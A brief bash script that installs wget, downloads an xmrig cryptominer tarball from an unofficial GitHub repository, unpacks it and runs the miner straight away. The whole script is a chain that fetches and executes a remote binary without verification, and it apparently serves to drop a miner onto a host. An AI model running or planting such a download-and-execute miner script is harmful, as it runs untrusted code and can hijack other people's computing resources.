#!/bin/bash
sudo apt install wget
apt install wget
wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz
tar xvf xmrigtar.tar.gz
cd xmrig-6.22.0
chmod +x xmrig
./xmrig
